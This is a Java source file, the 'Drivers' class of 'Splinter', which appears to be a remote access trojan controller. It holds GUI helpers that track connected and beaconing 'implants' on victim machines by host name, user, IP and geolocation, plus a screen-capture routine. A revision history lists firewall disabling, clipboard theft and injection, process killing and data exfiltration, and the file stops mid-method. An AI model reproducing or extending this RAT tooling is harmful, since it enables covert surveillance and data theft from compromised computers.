/**
 * 
 * @author Solomon Sonya 
 */


package Controller.Drivers;

import Controller.Thread.*;
import Controller.GUI.*;
import Implant.*;
import Implant.Payloads.MapNetworkInterface;
import Implant.Payloads.Worker_Thread_Payloads;

import java.text.DecimalFormat;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.*;
import java.net.NetworkInterface;

import javax.imageio.ImageIO;
import javax.swing.event.*;
import javax.swing.*;



/**
 * This is the Drivers class.  Simply used to call other methods/variables
 * 
 * DO NOT INSTANTIATE THIS CLASS!!!!!
 * 
 * @author Solomon Sonya
 *
 */



public class Drivers 
{
	public static final String strMyClassName = "Drivers";
	
	public static String fileSeperator = System.getProperty("file.separator");
	
	public static final String NICK_NAME = "Splinter";
	
	public static boolean outputEnabled = true;
	
	public static Image imgFrameIcon = null;
	
	public static ArrayList<JPanel_BeaconCommand> alBeaconCommands_GUI = new ArrayList<JPanel_BeaconCommand>();
	
	public static String strJTableColumn_InsertID = "Insert ID";

	
	
	
	public static final String DISCONNECT_TOKEN = "disconnectImplant";
	
	//pointers
	public static JLabel jlblNumImplantsConnected = null; 
	public static JTable_Solomon jtblConnectedImplants = null;
	public static JTable_Solomon jtblDisconnectedImplants = null;
	public static JTable_Solomon jtblBeaconImplants = null;
	public static JTable_Solomon jtblLoggingAgents = null;
	public static JPanel_TextDisplayPane txtpne_broadcastMessageBoard;
	public static JPanel_TextDisplayPane txtpne_BEACON_broadcastMessageBoard;
	public static JPanel_TextDisplayPane txtpne_mainChatBoard; 
	public static volatile DefaultListModel dfltLstMdl_ConnectedImplants;
	public static volatile DefaultListModel dfltLstMdl_BeaconingImplants;
	public static JList jlstConnectedImplants;
	public static JList jlstBeaconImplants;
	
	public static DefaultListModel dfltLstMdl_ConnectedControllers;
	public static JList jlstConnectedControllers;
	
	public static ArrayList<Thread_Terminal> alTerminals = null;
	
	public static JPanel_TextDisplayPane jtxtpne_CnslOut = null;
	
	//public static final double VERSION = Driver.VERSION; 
	/**
	 * REVISION HISTORY
	 * 0.1: NAPKIN MATH - CONCEPTION OF SPLINTER
	 * 1.0: INITIAL CONNECTION JUST WITH NETCAT
	 * 1.1: CONNECTION WITH NEW IMPLANTS... EFFICIENCY IMPROVED FOR WHILE LOOP WITH INTERRUPT...
	 * 1.2: EFFICIENCY IN 1.1 CAUSED A BUG WITH NETCAT, 1.2 FIXED THAT, IMPROVED THREADS ONCE AGAIN, AND BROUGHT THE REAL TIME PROCESS LIST COMMAND SHORTCUT
	 * 1.3: Running Process List Fully operational
	 * 1.31:Fixed Screen captures, effectively saves in the user temp directory and deletes images after they have been transmitted to controller.  Also added functionality to capture all plugged screens, and not just one screen. Also fixed bug in Process Snipe.
	 * 1.32: Added Up and Down array to auto complete the user's history of commands, added TRAP for the user entering "clear, cls, or clr" to auto clear the textpane screens, also updated private terminals to feel more like real terminals
	 * 1.33: Added System Enumeration shortcut command and FTP back to the controller!
	 * 1.34: Big leaps in this update.  This version introduces the File browser working among other things
	 * 1.35: Another big leap.  Got Chat among other shortcut commands to work
	 * 1.36: Windows Firewall interaction.  View, Enable, and Disable Windows Firewall
	 * 1.37: Incorporated Clipboard Extraction and Clipboard Injection
	 * 1.38: Incorporated Orbiter Payload, and Data Exfiltration 
	 */
	
	
	public static final int MAX_THREAD_COUNT = 900000;
	
	//flags
	public static volatile boolean acquireAgentOverheadData = true;//specifies if controller will automatically send commands to fill in the JTable data
	
	
	
	 
	//COLORS
	public static volatile Color clrBackground = Color.white;
	public static volatile Color clrForeground = Color.black;
	public static volatile Color clrController = Color.white;
	public static volatile Color clrImplant = Color.white;
	
	//Text Size
	public static int fontSize = 12;
	
	/**********************************
	* 
	* CONNECTED AGENTS' COL NAMES
	* 
	*************************************/
	public static String  	strImportantMessage_Header = "!",//this indicates there is an imporant msg or that the thread is still authenticating with Splinte
							strThreadID_Header = "Thread ID",
							strGeoLocation_Header = "Geo Location",
							strLastConnectionTime_Header = "Connection Time",
							strImplantID_Header = "Implant ID",
							strBeaconInterval_Header = "Beacon Interval",
							strNextBeaconApproxTime_Header = "Approx Time til Next Beacon",
							strDisconnectionTime_Header = "Disconnection Time",
							strImplantType_Header = "Implant Type",
							strCareOfAddress_Header = "Care Of",
							strImplantLaunchPath_Header = "Launch Path",
							strBinaryName_Header = "Binary",
							strSystemIP_Header = "System IP",
							strHostName_Header = "Host Name", 
							strOS_Header = "OS", 
							strOS_Type_Header = "OS Type",
							strUserName_Header = "User Name",
							strUserDomain_Header = "User Domain",
							strTempPath_Header = "Temp Path",
							strUserProfile_Header = "User Profile",
							
							strOS_Architecture_Header = "Architecture",
							strOS_ServicePack_Header = "Service Pack", 
							strNumUsers_Header = "# Users",
							strSerialNumber_Header = "Serial Number",					
							strProcessor_Header = "Processor",
							strNumberOfProcessors_Header = "# Processors",
							strCountryCode_Header = "Country Code",
							strSystemRoot_Header = "System Root",
							strHomeDrive_Header = "Home Drive", 
							strVersionNumber_Header = "Version Number";
	
	static String strImportntMessage_ToolTip = "Indicates there is an important message on this implant or that it has not finished authenticating with " + Drivers.NICK_NAME;
	static String strCareOfAddress_ToolTip = "Indicates the Hive this implant is connected through.  To send cmd to this implant, it actually is proxied through the \"Care Of\" agent (if applicable)";		
	static String strGeoLocation_ToolTip = "Geo Location Approximation based on last hop of router before connecting to the controller";		
	static String strBinaryName_ToolTip = "If known, this will be the name of binary impant file";


	
	//public static String [] jTableConnectedAgentsColNames  = new String[]{strImportantMessage_Header, strThreadID_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Architecture_Header, strOS_ServicePack_Header, strOS_Type_Header, strUserName_Header, strNumUsers_Header, strSerialNumber_Header, strUserDomain_Header, strProcessor_Header, strNumberOfProcessors_Header, strCountryCode_Header, strSystemRoot_Header, strHomeDrive_Header, strVersionNumber_Header, strTempPath_Header, strUserProfile_Header};
	//public static String[]arrJTableConnectedAgentsToolTips =  new String[]{strImportntMessage_ToolTip, strThreadID_Header, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Architecture_Header, strOS_ServicePack_Header, strOS_Type_Header, strUserName_Header, strNumUsers_Header, strSerialNumber_Header, strUserDomain_Header, strProcessor_Header, strNumberOfProcessors_Header, strCountryCode_Header, strSystemRoot_Header, strHomeDrive_Header, strVersionNumber_Header, strTempPath_Header, strUserProfile_Header};
	
	public static String [] jTableConnectedAgentsColNames  = new String[]{strImportantMessage_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath_Header, strBinaryName_Header, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header,  strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header};		
	public static Vector vctJTableConnectedAgentsColNames = new Vector(1,1);
	
	//public static String[]arrJTableConnectedAgentsToolTips =  new String[]{strImportntMessage_ToolTip, strThreadID_Header, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Architecture_Header, strOS_ServicePack_Header, strOS_Type_Header, strUserName_Header, strNumUsers_Header, strSerialNumber_Header, strUserDomain_Header, strProcessor_Header, strNumberOfProcessors_Header, strCountryCode_Header, strSystemRoot_Header, strHomeDrive_Header, strVersionNumber_Header, strTempPath_Header, strUserProfile_Header};
	public static String[]arrJTableConnectedAgentsToolTips =  new String[]{strImportntMessage_ToolTip, strThreadID_Header,strGeoLocation_ToolTip, strImplantType_Header, strCareOfAddress_ToolTip,strImplantLaunchPath_Header, strBinaryName_ToolTip, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header};	
	public static Vector vctJTableConnectedAgentsToolTips = new Vector(1,1);
	
	
	public static String [] jTableDISCONNECTED_AGENTS_ConnectedAgentsColNames  = new String[]{strDisconnectionTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath_Header, strBinaryName_Header, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header,  strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header};		
	public static Vector vctJTableDISCONNECTED_AGENTS_ConnectedAgentsColNames = new Vector(1,1);
	
	public static String[]arrJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips =  new String[]{strDisconnectionTime_Header, strThreadID_Header,strGeoLocation_Header, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath_Header, strBinaryName_ToolTip, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header};	
	public static Vector vctJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips = new Vector(1,1);
	
	
	public static String[]arrJTableBEACONING_AGENTS_ConnectedAgentsColNames =  new String[]{strLastConnectionTime_Header, strImplantID_Header, strBeaconInterval_Header, strNextBeaconApproxTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath_Header, strBinaryName_Header, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header};	
	public static Vector vctJTableBEACONING_AGENTS_ConnectedAgentsColNames = new Vector(1,1);
	
	public static String[]arrJTableBEACONING_AGENTS_ConnectedAgentsToolTips =  new String[]{strLastConnectionTime_Header, strImplantID_Header, strBeaconInterval_Header, strNextBeaconApproxTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath_Header, strBinaryName_ToolTip, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header};	
	public static Vector vctJTableBEACONING_AGENTS_ConnectedAgentsToolTips = new Vector(1,1);
	
	public volatile static Worker_Thread_Payloads workerthread_ScreenRecord = null;
	
	
	
	
	public static boolean appendRelayMessageCommandTerminal(String strToAppend)
	{
		try
		{
			Drivers.txtpne_broadcastMessageBoard.appendString(true, "ME", strToAppend + "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("appendRelayMessageCommandTerminal", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	
	public static boolean appendCommandTerminalStatusMessage(String strToAppend)
	{
		try
		{
			Drivers.txtpne_broadcastMessageBoard.appendString(true, "ME", "CONTROLLER MESSAGE: " + strToAppend + "\t\t\t\t\t\t\t\t\t\t\t\t\t", Drivers.clrBackground, Drivers.clrForeground);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("appendCommandTerminalStatusMessage", strMyClassName, e, "", false);			
		}
		
		return false;
	}
	
	public static boolean refreshNetworkInterface(JComboBox jcbToPopulate)
	{
		try
		{
			//
			//Get The Refreshed list
			//
			ArrayList<NetworkInterface> alNetworkInterfaces = MapNetworkInterface.listInterfaces();
			
			//
			//Ensure valid jcb passed in
			//
			if(jcbToPopulate == null)
			{
				return false;
			}
			
			if(alNetworkInterfaces == null)
			{
				Drivers.sop("Could not populate Network Interfaces!!!");
				return false;
			}
			
			//
			//Populate the JCB
			//
			jcbToPopulate.removeAllItems();
			for(int i = 0; i < alNetworkInterfaces.size(); i++)
			{
				jcbToPopulate.addItem(alNetworkInterfaces.get(i).toString());
			}
			
		}
		catch(Exception e)
		{
			Drivers.eop("refreshNetworkInterface", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public static boolean removeThread(Thread_Terminal threadToRemove, long threadID_ToRemove)
	{
		try
		{
			if(Drivers.alTerminals == null || Drivers.alTerminals.size() < 1)
			{
				sop("ArrayList is empty. No clients further to remove");
				return false;
			}
			
			if(threadToRemove == null)
			{
				sop("No agent received to disconnect.");
				return false;
			}
			
			try{	threadToRemove.I_am_Disconnected_From_Implant = true;/*ensure it knows it's disconnected*/} catch(Exception e){}
			
			//remove thread from Active Implant's list
			if(Drivers.alTerminals.contains(threadToRemove))
			{
				Drivers.alTerminals.remove(threadToRemove);
				threadToRemove.I_am_Disconnected_From_Implant = true;//ensure it knows it's disconnected
			}
			
			//Add thread to disconnected implant's list
			try
			{
				if(threadToRemove.i_am_Beacon_Agent)
				{
					threadToRemove.sktMyConnection.close();
				}
				else //only add to disconnected implants if this is not a beaconing agent, otherwise, this jtable will fill up quickly!
				{					
					Drivers.jtblDisconnectedImplants.addRow(threadToRemove.getJTableRowData());
				}
			}catch(Exception e){}
			
			//update connected agents
			
			try
			{
				if(threadToRemove.i_am_Beacon_Agent)
				{
					Drivers.jtblBeaconImplants.updateJTable = true;
					Drivers.updateBeaconImplants();
				}
				else
				{
					Drivers.updateConnectedImplants();			
					Drivers.jtblConnectedImplants.updateJTable = true;
				}
			}
			catch(Exception e){}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			sop("Exception handled when removing thread id: " + threadID_ToRemove);
		}
		
		try
		{
			if(threadToRemove.i_am_Beacon_Agent)
			{
				Drivers.updateBeaconImplants();
			}
			else
			{
				Drivers.updateConnectedImplants();			
				Drivers.jtblConnectedImplants.updateJTable = true;
			}
		}
		catch(Exception e){}
		
		return false;
	}
	
	public static ArrayList<Thread_Terminal> getSelectedClients(JPanel_MainControllerWindow controller_window)
	{
		ArrayList ll = null;
		
		try
		{
			ll = new ArrayList<Thread_Terminal>();
			int selectedIndex = controller_window.jlstConnectedClients.getSelectedIndex();
			
			if(selectedIndex > 0)
			{
				ll.add(Drivers.alTerminals.get(selectedIndex));
				
				return ll;
			}
		}
		catch(Exception e)
		{
			Drivers.eop("getSelectedClients", strMyClassName, e, "", false);
		}
						
		return Drivers.alTerminals;
	}
	
	public static boolean setJFrameIcon(JDialog frame)
	{
		
		try	
		{					
			
			Image imgFrameIcon = new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage();
			frame.setIconImage(imgFrameIcon);
			
		}catch(Exception e){Drivers.sop("Unable to set JFrame Icon");}
		
				
		return false;
	}
	
	
	
	public static boolean setJFrameIcon(JFrame frame)
	{
		
		try	
		{					
			
			Image imgFrameIcon = new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage();
			frame.setIconImage(imgFrameIcon);
			
		}catch(Exception e){Drivers.sop("* * Unable to set JFrame Icon");}
		
				
		return false;
	}
	
	public static boolean updateBeaconImplants()
	{
		try
		{
			
			//else remove everything and add the agents back in
			try
			{
				Drivers.jtblBeaconImplants.removeAllRows();							
				
			}catch(Exception e){}//do n/t
			
			try
			{
				
				jtblBeaconImplants.jbtnRefresh.setEnabled(false);
				jtblBeaconImplants.jbtnDisconnectImplant.setEnabled(false);
				jtblBeaconImplants.jbtnGoogleMap.setEnabled(false);
				
			}catch(Exception e){}
			
		
			if(Driver.alBeaconTerminals.size() > 0)
			{
				try
				{
					jtblBeaconImplants.jbtnRefresh.setEnabled(true);
					jtblBeaconImplants.jbtnDisconnectImplant.setEnabled(true);
					jtblBeaconImplants.jbtnGoogleMap.setEnabled(true);
				}catch(Exception e){}
				
			}
			
			Thread_Terminal thread = null;						
			
			for(int i = 0; i < Driver.alBeaconTerminals.size(); i++)
			{
				try
				{
					thread = Driver.alBeaconTerminals.get(i);
					
					//
					//JTABLE CONNECTED IMPLANTS
					//
					Drivers.jtblBeaconImplants.addRow(thread.getJTableRowData());
										
					//
					//JLIST CONNECTED IMPLANTS
					//
					//dfltLstMdl_ConnectedImplants.addElement(thread.getJListData());
					
					//
					//JLIST CONNECTED CHAT CONTROLLERS
					//
					//dfltLstMdl_ConnectedControllers.addElement(thread.getChatJListData());
				}
				catch(ArrayIndexOutOfBoundsException aiob)
				{
					Drivers.sop("***No BEACON thread to add!!!");
				}
				
			}
			
			//sop("Size: " + Drivers.dfltLstMdl_ConnectedImplants.getSize());
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("updateBeaconImplants", "Drivers", e, e.getLocalizedMessage(), false);
			//e.printStackTrace(System.out);
		}
		
		return false;
	}
	
	
	public static boolean updateLoggingAgents()
	{
		try
		{
			
			//else remove everything and add the agents back in
			try
			{
				Drivers.jtblLoggingAgents.removeAllRows();							
				
			}catch(Exception e){}//do n/t
			
			try
			{
				
				jtblLoggingAgents.jbtnRefresh.setEnabled(false);
				jtblLoggingAgents.jbtnDisconnectImplant.setEnabled(false);
				jtblLoggingAgents.jbtnGoogleMap.setEnabled(false);
				
			}catch(Exception e){}
			
		
			if(Driver.alLoggingAgents.size() > 0)
			{
				try
				{
					jtblLoggingAgents.jbtnRefresh.setEnabled(true);
					jtblLoggingAgents.jbtnDisconnectImplant.setEnabled(true);
					jtblLoggingAgents.jbtnGoogleMap.setEnabled(true);
				}catch(Exception e){}
				
			}
			
			Thread_Terminal thread = null;						
			
			for(int i = 0; i < Driver.alLoggingAgents.size(); i++)
			{
				try
				{
					thread = Driver.alLoggingAgents.get(i);
					
					//
					//JTABLE CONNECTED IMPLANTS
					//
					Drivers.jtblLoggingAgents.addRow(thread.getJTableRowData());
										
					//
					//JLIST CONNECTED IMPLANTS
					//
					//dfltLstMdl_ConnectedImplants.addElement(thread.getJListData());
					
					//
					//JLIST CONNECTED CHAT CONTROLLERS
					//
					//dfltLstMdl_ConnectedControllers.addElement(thread.getChatJListData());
				}
				catch(ArrayIndexOutOfBoundsException aiob)
				{
					Drivers.sop("***No LOGGIE thread to add!!!");
				}
				
			}
			
			//sop("Size: " + Drivers.dfltLstMdl_ConnectedImplants.getSize());
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("updateLoggingAgents", "Drivers", e, e.getLocalizedMessage(), false);
			//e.printStackTrace(System.out);
		}
		
		return false;
	}
	
	public static boolean indicateServerSocketStatus_Closed()
	{
		try
		{
			//indicate server socket messages
			
			Splinter_GUI.jlblServerSocketStatus.setText("CLOSED");
			Splinter_GUI.jlblEstablishedPort.setText("NOT ESTABLISHED");
			Splinter_GUI.jlblLHOST_ME_IP.setText("SOCKET CLOSED");
			
			Splinter_GUI.jlblServerSocketStatus.setBackground(Color.RED);
			Splinter_GUI.jlblServerSocketStatus.setForeground(Color.WHITE);
			/*Splinter_GUI.jlblEstablishedPort.setBackground(Color.RED);
			Splinter_GUI.jlblLHOST_ME_IP.setBackground(Color.RED);
			
			Splinter_GUI.jlblServerSocketStatus.setForeground(Color.WHITE);
			Splinter_GUI.jlblEstablishedPort.setForeground(Color.WHITE);
			Splinter_GUI.jlblLHOST_ME_IP.setForeground(Color.WHITE);*/
			
			return true;
		}
		catch(Exception e)
		{
			eop("indicateServerSocketStatus_Closed", "Drivers - Controller", e, e.getLocalizedMessage(), false);
	
		}
		
		return false;
	}
	
	
	
	public static boolean updateConnectedImplants()
	{
		try
		{
			jlblNumImplantsConnected.setText("" + Drivers.alTerminals.size());
			
			
			
			//else remove everything and add the agents back in
			try
			{
				Drivers.jtblConnectedImplants.removeAllRows();			
				//Drivers.jtblBeaconImplants.removeAllRows();
				
				Drivers.dfltLstMdl_ConnectedImplants.removeAllElements();
				dfltLstMdl_ConnectedControllers.removeAllElements();
				
			}catch(Exception e){}//do n/t
			
			try
			{
				jtblConnectedImplants.jbtnRefresh.setEnabled(false);
				jtblConnectedImplants.jbtnDisconnectImplant.setEnabled(false);
				jtblConnectedImplants.jbtnGoogleMap.setEnabled(false);
				
				/*jtblBeaconImplants.jbtnRefresh.setEnabled(false);
				jtblBeaconImplants.jbtnDisconnectImplant.setEnabled(false);
				jtblBeaconImplants.jbtnGoogleMap.setEnabled(false);*/
				
			}catch(Exception e){}
			
			if(Drivers.alTerminals.size() > 0)
			{
				try
				{
					jtblConnectedImplants.jbtnRefresh.setEnabled(true);
					jtblConnectedImplants.jbtnDisconnectImplant.setEnabled(true);
					jtblConnectedImplants.jbtnGoogleMap.setEnabled(true);
				}catch(Exception e){}
				
			}
			
			/*if(Driver.alBeaconTerminals.size() > 0)
			{
				try
				{
					jtblConnectedImplants.jbtnRefresh.setEnabled(true);
					jtblBeaconImplants.jbtnRefresh.setEnabled(true);
					jtblBeaconImplants.jbtnDisconnectImplant.setEnabled(true);
					jtblBeaconImplants.jbtnGoogleMap.setEnabled(true);
				}catch(Exception e){}
				
			}*/
			
			Thread_Terminal thread = null;
			
			for(int i = 0; i < Drivers.alTerminals.size(); i++)
			{
				try
				{
					//Drivers.jtblConnectedImplants.addRow(Drivers.alTerminals.get(i).getJTableRowData());
					
					thread = Drivers.alTerminals.get(i);
					
					//
					//JTABLE CONNECTED IMPLANTS
					//
					Drivers.jtblConnectedImplants.addRow(thread.getJTableRowData());
					
					//int lstPos = Drivers.jlstConnectedImplants.getModel().getSize();				
					//Append the name at the end of the JList
					//dfltLstMdl_ConnectedImplants.add(i, thread.getJListData());
					
					//
					//JLIST CONNECTED IMPLANTS
					//
					//dfltLstMdl_ConnectedImplants.add(i, thread.getJListData());
					dfltLstMdl_ConnectedImplants.addElement(thread.getJListData());
					
					//
					//JLIST CONNECTED CHAT CONTROLLERS
					//
					dfltLstMdl_ConnectedControllers.addElement(thread.getChatJListData());
				}
				catch(ArrayIndexOutOfBoundsException aiob)
				{
					Drivers.sop("***No thread to add!!!");
				}
				
			}
			
			/*for(int i = 0; i < Driver.alBeaconTerminals.size(); i++)
			{
				try
				{
					thread = Driver.alBeaconTerminals.get(i);
					
					//
					//JTABLE CONNECTED IMPLANTS
					//
					Drivers.jtblBeaconImplants.addRow(thread.getJTableRowData());
										
					//
					//JLIST CONNECTED IMPLANTS
					//
					//dfltLstMdl_ConnectedImplants.addElement(thread.getJListData());
					
					//
					//JLIST CONNECTED CHAT CONTROLLERS
					//
					//dfltLstMdl_ConnectedControllers.addElement(thread.getChatJListData());
				}
				catch(ArrayIndexOutOfBoundsException aiob)
				{
					Drivers.sop("***No BEACON thread to add!!!");
				}
				
			}*/
			
			//sop("Size: " + Drivers.dfltLstMdl_ConnectedImplants.getSize());
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("updateConnectedImplants", "Drivers", e, e.getLocalizedMessage(), false);
			//e.printStackTrace(System.out);
		}
		
		return false;
	}
	
	
	
	
	
	public static void sop(String line)
	{
		if(outputEnabled)
			System.out.println(line);
		
		if(Drivers.jtxtpne_CnslOut != null)
			Drivers.jtxtpne_CnslOut.appendString(false,  line, Drivers.clrForeground, Drivers.clrBackground);
	}
	
	public static void sp(String line)
	{
		if(outputEnabled)
			System.out.print(line);
		
		if(Drivers.jtxtpne_CnslOut != null)
			Drivers.jtxtpne_CnslOut.appendString(false,  line, Drivers.clrForeground, Drivers.clrBackground);
	}
	
	public static boolean setColorScheme_Default()
	{
		try
		{
			
			clrBackground = Color.white;
			clrForeground = Color.black;
			clrController = Color.white;
			clrImplant = Color.white;
			
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.sop("setColorScheme_Default");
		}
		
		return false;
	}
	
	static public void eop(String mtdName, String strMyClassName, Exception e, String errorMessage, boolean printStackTrace)
	{
		if(errorMessage == null || errorMessage.trim().equals(""))
			sop("\nException caught in " + mtdName + " mtd in " + strMyClassName);
		
		else 
			sop("\nException caught in " + mtdName + " mtd in " + strMyClassName + " Error Message: " + errorMessage);
		
		if(printStackTrace)
			e.printStackTrace(System.out);
	}
	
	
	
	public static File captureScreen(String screenImgSavePath, String fileNameWithoutExtension)
	{
		try
		{
			if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			{
				screenImgSavePath = "." + Driver.fileSeperator; 
			}
			
			
			
			File fleCaptureFile = new File( screenImgSavePath, fileNameWithoutExtension + "." + "png");
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			//ImageIO.write(imgCapture, "png", new File( screenImgSavePath, fileNameWithoutExtension + "." + "png")); 
			ImageIO.write(imgCapture, "png", fleCaptureFile);
			
			return fleCaptureFile;
		}
		catch(Exception e)
		{
			Driver.eop("screenImgSavePath", "Drivers - Controller", e, e.getLocalizedMessage(), false);
		}
		
		//try to save the file to the current working directory, perhaps that will help
		try
		{
			//if(screenImgSavePath == null || screenImgSavePath.trim().equals(""))
			//{
				screenImgSavePath = "." + Driver.fileSeperator; 
			//}
			
			File fleCaptureFile = new File( screenImgSavePath, fileNameWithoutExtension + "." + "png");
			
			Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
			ImageIO.write(imgCapture, "png", new File( screenImgSavePath, fileNameWithoutExtension + "." + "png")); 
			
			
			return fleCaptureFile;
		}
		catch(Exception ee)
		{
			Driver.sop("Second attempt to save file at current working directory was unsuccessful as well");
		}
		
		return null;
	}
	
	
	/**
	 * This method just returns the current system clock time in the format HH:MM "SS
	 */
	public static String getTimeStamp_Without_Date()
	{
		Date dateTime;// = new Date();//get the current date, time, timezone  //  @jve:decl-index=0:

		String timeToSplit = "";
		String dateTime_To_Display = "";  //  @jve:decl-index=0:
		String [] arrSplitTime;
		String [] arrSplitHour;
		String strHourMin = "";
		
		dateTime = new Date();
		
		try
		{	
			timeToSplit = dateTime.toString();
						
			arrSplitTime = timeToSplit.split(" ");//return an array with Day_Name Mon Day_Num HH:MM:SS LocalTime YYYY
						
			if(arrSplitTime.length != 6)//ensure array was split properly; if it's length is not 6, then an error occurred, so just show the simple time by throwing the exception
				throw new Exception();
			
			arrSplitHour = (arrSplitTime[3]).split(":");
			
			if(arrSplitHour.length != 3)//again, ensure we split the time from 18:57:48 bcs we only want 18:57
				throw new Exception();
			
			return strHourMin = arrSplitHour[0] + ":" + arrSplitHour[1] + " \"" + arrSplitHour[2];  
			
			
		}//end try
		catch(Exception e)//incase an error is generated from the above parse of the time and date, simply display the generic date for the client
		{
			dateTime_To_Display = "Time: " + dateTime.toString();
		}
		
		return dateTime_To_Display;		
	}//end mtd getTimeStamp
	
	public static int jop_Confirm(String strText, String strTitle)
	{
		try
		{
			return JOptionPane.showConfirmDialog(null, strText, strTitle, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
		}
		catch(Exception e)
		{
			//Drivers.eop("queryDialog", strMyClassName, e, e.getMessage(), true);
		}
		
		return -1;
	}
	
	public static int jop_Confirm_YES_NO_CANCEL(String strText, String strTitle)
	{
		try
		{
			return JOptionPane.showConfirmDialog(null, strText, strTitle, JOptionPane.YES_NO_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE);
		}
		catch(Exception e)
		{
			//Drivers.eop("queryDialog", strMyClassName, e, e.getMessage(), true);
		}
		
		return -1;
	}
	
	/**
	 * This method queries the user via JChooser to select a file
	 */
	public static File querySelectFile(boolean openDialog, String dialogueTitle, int fileChooserSelectionMode, boolean thisLoadsCSV, boolean useFileFilter)
	{
		
		/**
		 * Drivers_Thread.fleCarrier_NetworkCommand = Drivers.querySelectFile(true, "Please Select the Carrier Image to hold the Steganographic command(s) and content", JFileChooser.FILES_ONLY, false, true);
			
			if(Drivers_Thread.fleCarrier_NetworkCommand == null)
			{
				this.jtfCarrierImage_Settings.setText("No Carrier Destination File Selected");
				this.jtfCarrierImage_Settings.setToolTipText("No Carrier Destination File Selected");
			}
			
			else//a good file was selected
			{
				this.jtfCarrierImage_Settings.setText(Drivers_Thread.fleCarrier_NetworkCommand.getCanonicalPath());
				jtfCarrierImage_Settings.setToolTipText(Drivers_Thread.fleCarrier_NetworkCommand.getCanonicalPath());
			}
		 */
		
		try
		{
			JFileChooser jfc = new JFileChooser(new File("."));
			jfc.setFileSelectionMode(fileChooserSelectionMode);
			jfc.setDialogTitle(dialogueTitle);
			//jfc.setMultiSelectionEnabled(enableMultipleFileSelection);
			
			if(thisLoadsCSV)
			{
				jfc.setFileFilter(new javax.swing.filechooser.FileFilter() 
				{
		            public boolean accept(File fle) 
		            {
		                //accept directories
		            	if(fle.isDirectory())
		                	return true;
		            	
		            	String strFleName = fle.getName().toLowerCase();
		                 
		                return strFleName.endsWith(".csv");
		              }
		   
		              public String getDescription() 
		              {
		                return "Comma Separated Values";
		              }
		              
		         });
				
			}
			
			/***************************************
			 * Filter for only Specified Formats
			 ***************************************/
			else if(useFileFilter)
